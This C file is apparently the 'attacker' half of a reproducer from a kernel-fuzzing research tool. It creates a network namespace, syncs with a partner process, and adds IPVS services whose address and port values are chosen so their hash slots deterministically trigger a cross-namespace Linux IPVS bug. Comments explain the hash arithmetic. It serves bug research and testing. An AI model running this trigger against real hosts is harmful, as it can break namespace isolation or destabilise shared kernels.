#define _GNU_SOURCE
#include "comm.h"
#include <stdlib.h>
#include <stdio.h>
#include <sched.h>
#include <string.h>

int main() {
        if (init_exec_sync()) {
                perror("exec sync");
                exit(-1);
        }
        // Setup stage, similar to Syzkaller executor's 
        // do_sandbox_namespace().
        if (unshare(CLONE_NEWNET)) {
                perror("unshare");
                exit(-1);
        }
        // Handshake
        if (exec_notify()) {
                perror("exec notify");
                exit(-1);
        }
        if (exec_wait_nosig(10000)) {
                perror("exec wait");
                exit(-1);
        }
        
        system("ip a add dev lo 127.0.0.1/8");
        if (!flag_skip_prog) {
                // To trigger this bug, one must ensure that at least one sender created ipvs svs node
                // is not less than the victim created ipvs svc node in terms of slot number in the ip_vs_svc_table hash table.
                // The node insertion slot number is calculated by (proto ^ addr ^ (port>>8) ^ port ^ netns_ipvs_addr) & 255 (ip_vs_svc_hashkey()).
                // Unfornately, netns_ipvs_addr, a per net-ns address, is non-determinisitc accross different runs.
                // Thus, if sender progam and receiver program starts ip vs services using arbitrary IP address and ports, then there are some chances
                // that this bug could not be triggered.
                // Here we present a method to _determinisitcally_ trigger this bug by carefully crafting the input.
                // Specifically, for each container, inserting two nodes, where one node's (proto ^ addr ^ (port>>8) ^ port) is 255 and
                // the other node's (proto ^ addr ^ (port>>8) ^ port) is 0. In this way, the slot number for two nodes are (netns_ipvs_addr&255)
                // and ~(netns_ipvs_addr&255) and there will be one node in slot region [0, 127] and [128, 255].
                // Given that proto is 6, we can easily derive the belowing input.
                // This case shows the importance of sequential test program generation. Our tool could benefit from the progress in this field.
                system("ipvsadm -A -t 10.0.0.0:6");
                system("ipvsadm -A -t 10.0.0.0:249");
        }
        fprintf(stderr, "Attcker: I am done\n");
        if (exec_notify()) {
                perror("exec notify");
                exit(-1);
        }
        if (exec_wait_nosig(10000)) {
                perror("exec wait");
                exit(-1);
        }
        if (exec_wait_nosig(10000)) {
                perror("exec wait");
                exit(-1);
        }
        char *s = "done()";
        if (write(kReplyFd, s, strlen(s)) == -1) {
                perror("write");
                exit(-1);
        }
        while(1) {
                sleep(100000);
        }
        return 0;
}